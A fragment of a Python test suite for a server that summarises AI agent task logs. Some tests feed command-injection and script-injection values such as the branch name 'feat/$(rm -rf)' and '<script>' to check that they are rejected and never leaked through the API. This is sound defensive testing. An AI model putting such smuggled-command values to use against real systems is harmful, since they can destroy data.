        self.assertEqual(server._extras(None), {"tarefas": None, "linhas": None, "modelo": None, "ramo": None})

    def test_ca45_subagente_tem_as_suas_e_dry_run_sem_nada(self):
        self.task(lines=fake.tool_use("u1", "Agent") + fake.todo_write("u2", ["completed", "pending"]))
        self.sub("T1", "a1", fake.todo_write("s1", ["completed"] * 3 + ["pending"]))
        t = self.get()
        self.assertEqual(t["lead"]["tarefas"], {"feitas": 1, "total": 2})
        self.assertEqual(t["agents"][0]["tarefas"], {"feitas": 3, "total": 4})
        self.reset()
        self.task("T2", lines=fake.todo_write("u1", ["completed"]), mode="dry-run")
        self.assertEqual(extras(self.get("T2")["lead"]), {"tarefas": None, "linhas": None, "modelo": None,
                                                          "ramo": None})


class LinhasTest(Live):
    def linhas(self):
        return self.get()["lead"]["linhas"]

    def test_ca46_structured_patch(self):
        patch = ["+a", "+b", "-c", " d", "", 5, None, "+"]
        self.task(lines=fake.edit("u1", "c", "a\nb") + fake.edit_result("u1", patch))
        self.assertEqual(self.linhas(), {"mais": 3, "menos": 1, "aprox": False})

    def test_ca46_sem_patch_estimativa_aprox(self):
        casos = [(fake.edit("u1", "x\ny", "a\nb\nc"), (3, 2)),
                 (fake.multi_edit("u1", [("x", "a\nb"), ("y\nz", "c")]), (3, 3)),
                 (fake.write("u1", "1\n2\n3\n4"), (4, 0)),
                 (fake.edit("u1", "", ""), (0, 0))]
        for lines, (mais, menos) in casos:
            with self.subTest(lines=lines[:80]):
                self.reset()
                self.task(lines=lines + fake.edit_result("u1"))
                self.assertEqual(self.linhas(), {"mais": mais, "menos": menos, "aprox": True})

    def test_ca46_write_novo_conta_o_content_exacto(self):
        for content, mais in (("a\nb", 2), ("a\nb\n", 2), ("", 0)):
            with self.subTest(content=content):
                self.reset()
                tur = {"type": "create", "filePath": "/x/a.py", "content": content, "structuredPatch": []}
                self.task(lines=fake.write("u1", content) + fake.tool_result("u1", tool_use_result=tur))
                self.assertEqual(self.linhas(), {"mais": mais, "menos": 0, "aprox": False})

    def test_ca46_erro_nao_conta_soma_e_outras_ferramentas(self):
        path = self.task(lines=fake.edit("u1", "x", "a") + fake.edit_result("u1", is_error=True)
                         + fake.tool_use("r1", "Read") + fake.edit_result("r1", ["+a"]))
        self.assertIsNone(self.linhas())
        self.append(path, fake.edit("u2", "x", "a") + fake.edit_result("u2", ["+a", "-x"])
                    + fake.edit("u3", "y", "b\nc") + fake.edit_result("u3", ["+b", "+c", "-y"]))
        self.assertEqual(self.linhas(), {"mais": 3, "menos": 2, "aprox": False})

    def test_ca46_nlinhas_e_tecto(self):
        for s_, n in {"": 0, "a": 1, "a\n": 1, "a\nb": 2, "a\nb\n": 2, "\n": 1, None: 0, 5: 0}.items():
            with self.subTest(s=s_):
                self.assertEqual(server._nlinhas(s_), n)
        fs = server._FileState(1)
        fs.mais = server.LINHAS_MAX - 1
        server._linhas(fs, None, 5, 3)
        self.assertEqual((fs.mais, fs.menos, fs.aprox, fs.edit_ok), (server.LINHAS_MAX, 3, True, True))

    def test_ca46_primeira_leitura_pelo_fim_e_aprox(self):
        pad = fake.text("x" * 1000) * (server.TAIL_FIRST // 1000 + 10)
        self.task(lines=pad + fake.edit("u1", "x", "a") + fake.edit_result("u1", ["+a", "-x"]))
        self.assertEqual(self.linhas(), {"mais": 1, "menos": 1, "aprox": True})


class ModeloRamoTest(Live):
    def test_ca46_validos_e_vale_a_ultima_linha(self):
        path = self.task(lines=fake.tool_use("u1", "Read", model="claude-opus-5-5", git_branch="feat/lite-v3"))
        self.assertEqual(extras(self.get()["lead"]), {"tarefas": None, "linhas": None, "modelo": "claude-opus-5-5",
                                                      "ramo": "feat/lite-v3"})
        self.append(path, fake.tool_result("u1", git_branch="fix/x_1.2"))
        self.assertEqual(self.get()["lead"]["ramo"], "fix/x_1.2")

    def test_ca46_invalidos_dao_null(self):
        for m in ("<synthetic>", "<script>", "a" * 61, "", "m o", 5, ["x"]):
            with self.subTest(m=m):
                self.reset()
                self.task(lines=fake.tool_use("u0", "Read", model="ok-1") + fake.tool_use("u1", "Read", model=m))
                self.assertIsNone(self.get()["lead"]["modelo"])
        for r in ("feat/$(rm -rf)", "..", "a/../b", "-x", "/x", "a" * 81, "", "ramo com espaço", 5, ["x"]):
            with self.subTest(r=r):
                self.reset()
                self.task(lines=fake.tool_use("u0", "Read", git_branch="ok") + fake.tool_use("u1", "Read",
                                                                                            git_branch=r))
                self.assertIsNone(self.get()["lead"]["ramo"])
        self.reset()
        self.task(lines=fake.tool_use("u0", "Read", model="a" * 60, git_branch="a" * 80))
        self.assertEqual((self.get()["lead"]["modelo"], self.get()["lead"]["ramo"]), ("a" * 60, "a" * 80))

    def test_ca46_subagente(self):
        self.task(lines=fake.tool_use("u1", "Agent", model="claude-opus-5-5"))
        self.sub("T1", "a1", fake.tool_use("s1", "Edit", model="claude-sonnet-4-5", git_branch="feat/a"))
        a = self.get()["agents"][0]
        self.assertEqual((a["modelo"], a["ramo"]), ("claude-sonnet-4-5", "feat/a"))


# --- contrato partilhado com o demo (tests/estado_chaves.json) ---
class ChavesTest(Live):
    def test_chaves_iguais_ao_ficheiro(self):
        self.task(lines=fake.tool_use("u1", "Agent"))
        self.sub("T1", "a1", fake.tool_use("s1", "Read"))
        self.task("T2", lines=fake.thinking(), status="concluída", finished_at=naive(600))
        base.ServerTest.mkt_sessions(self)
        base.ServerTest.mkt_task(self)
        st = server.build_state(NOW)
        self.assertEqual(sorted(st), CHAVES["topo"])
        self.assertEqual({t["squad"] for t in st["tasks"]}, {"dev", "marketing"})
        self.assertEqual({t["running"] for t in st["tasks"]}, {True, False})
        for t in st["tasks"]:
            with self.subTest(t=t["id"]):
                self.assertEqual(sorted(t), CHAVES["tarefa"])
                self.assertEqual(sorted(t["lead"]), CHAVES["lider"])
                for a in t["agents"]:
                    self.assertEqual(sorted(a), CHAVES["agente"])
        self.assertTrue(any(t["agents"] for t in st["tasks"]))


# --- CA-47: nada do input/resultado das ferramentas sai (/api/state e /api/quadro) ---
S = "SEGREDO-"


def segredos(age=0):
    return (fake.todo_write("t1", ["completed", "pending"], content=S + "x4", age=age)
            + fake.task_create("c1", subject=S + "x5", age=age)
            + fake.edit("e1", "a", S + "x6", file_path="/x/" + S + "x7/a.py", age=age, git_branch="feat/$(rm -rf)",
                        model="<script>")
            + fake.tool_result("e1", age=age, tool_use_result={
                "filePath": "/x/a.py", "originalFile": S + "x8", "oldString": "a", "newString": S + "x6",
                "structuredPatch": [{"oldStart": 1, "lines": ["+" + S + "x9", "-a"]}]})
            + fake.tool_use("z", "Read", age=age, model="<script>", git_branch="feat/$(rm -rf)"))


class SegredosHttpTest(HttpBase):
    task, session, pdir, sub = LiveBase.task, LiveBase.session, LiveBase.pdir, LiveBase.sub

    def test_ca47_nada_do_input_sai(self):
        self.task(lines=fake.tool_use("u1", "Agent") + segredos())
        self.sub("T1", "a1", segredos())
        for path in ("/api/state", "/api/quadro"):
            with self.subTest(path=path):
                body = self.get(path)
                for x in ("x4", "x5", "x6", "x7", "x8", "x9"):
                    self.assertNotIn(S + x, body)
                for x in ("rm -rf", "<script>", "structuredPatch", "old_string", "file_path", "originalFile",
                          "activeForm", "subject"):
                    self.assertNotIn(x, body)
        t = next(t for t in json.loads(self.get("/api/state"))["tasks"] if t["id"] == "T1")
        self.assertEqual(extras(t["lead"]), {"tarefas": {"feitas": 0, "total": 1},
                                             "linhas": {"mais": 1, "menos": 1, "aprox": False},
                                             "modelo": None, "ramo": None})



class Woff2Test(unittest.TestCase):
    def test_woff2_com_tipo_certo_sem_mime_types(self):
        # com nosniff o tipo tem de ser certo; a imagem alpine não tem /etc/mime.types (não depende do ficheiro)
        self.assertEqual(server.Handler.extensions_map[".woff2"], "font/woff2")
        h = server.Handler.__new__(server.Handler)
        self.assertEqual(h.guess_type("fonts/x.woff2"), "font/woff2")
        self.assertEqual(h.guess_type("x.css"), "text/css")
        self.assertEqual(h.guess_type("x.js"), "text/javascript")


if __name__ == "__main__":
    unittest.main()


class LogScanEstadoTest(EstadoBase):
    def test_build_state_a_correr_le_so_64_kb(self):
        # sem custo na meta: a tarefa a correr pede o claude.log sem releitura; a terminada, com ela
        junk = '{"type": "assistant", "x": "' + "y" * 200_000 + '"}\n'
        self.dev("T-corre", log=junk, status="a correr", cost_usd=None)
        self.dev("T-fim", log=junk, cost_usd=None)
        lidos = []
        real = server._log_scan

        def spy(p, correr=False):
            lidos.append((p.parent.name, correr))
            return real(p, correr)
        with unittest.mock.patch.object(server, "_log_scan", spy):
            server.build_state()
        self.assertIn(("T-corre", True), lidos)
        self.assertIn(("T-fim", False), lidos)
        self.assertNotIn(("T-corre", False), lidos)
